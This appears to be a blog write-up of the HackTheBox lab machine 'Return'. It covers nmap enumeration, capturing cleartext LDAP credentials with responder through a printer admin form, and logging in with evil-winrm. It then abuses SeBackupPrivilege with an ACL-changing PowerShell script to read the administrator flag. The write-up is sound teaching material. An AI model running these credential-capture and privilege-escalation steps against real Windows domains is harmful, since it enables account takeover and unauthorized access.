---
title: 'return.htb'
date: 2022-07-03
description: 'Writeup for Return, an easy HTB box showcasing basic responder usage.'
---

Return is an easy HackTheBox CTF that introduces the player to basic responder usage and the privilege escalation techniques allotted by `SeBackupPrivilege`.

## Enumeration
An initial rustscan revealed a typical CTF’s active directory attack surface. This is to say that the common Windows ports associated with AD and kerberos were open, including 88, 135, 139, 445, etc. Nmap’s full output is as follows:

```text
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2022-06-30 11:19:15Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack Microsoft Windows RPC
49682/tcp open  msrpc         syn-ack Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

Checking out port 80 brings me to a web page with a form asking for a printer’s IP.

## Foothold
I launch responder and put in my machine’s IP then submit the form. I immediately receive an LDAP callback including a cleartext username and password.

```text
[LDAP] Cleartext Client   : ::ffff:10.10.11.108
[LDAP] Cleartext Username : return\svc-printer
[LDAP] Cleartext Password : 1edFg43012!!
```

I use evil-winrm to login to the machine and get the user flag.

```text
┌──(u㉿fricative)-[~/Documents/ctf/return]
└─$ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'                 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-printer\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\svc-printer\desktop> cat user.txt
84d971899a07cc4b935e7331bdb8c88a
```

## Privilege Escalation(s)
Using the command `whomai /priv` I can see that this user, svc-printer has the `SeBackupPrivilege`. To escalate my privileges and read the root flag I import a [powershell script](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1) that utilitzes the Set-Acl powershell command to change the file permissions of an arbitrary filepath.

I use the script on the `C:\Users\Administrator` directory and am able to read the root flag.

```text
*Evil-WinRM* PS C:\Users\svc-printer\desktop> Acl-FullControl -user return.local\svc-printer -path C:\users\administrator
[+] Current permissions:


Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         RETURN\Administrator Allow  FullControl
Audit  :
Sddl   : O:BAG:SYD:P(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;LA)



[+] Changing permissions to C:\users\administrator
[+] Acls changed successfully.


Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         RETURN\Administrator Allow  FullControl
         RETURN\svc-printer Allow  FullControl
Audit  :
Sddl   : O:BAG:SYD:PAI(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;LA)(A;OICI;FA;;;S-1-5-21-3750359090-2939318659-876128439-1103)



*Evil-WinRM* PS C:\Users\svc-printer\desktop> cat C:\users\administrator\desktop\root.txt
3d24814bcaddab9b9bdc96674d18e136
```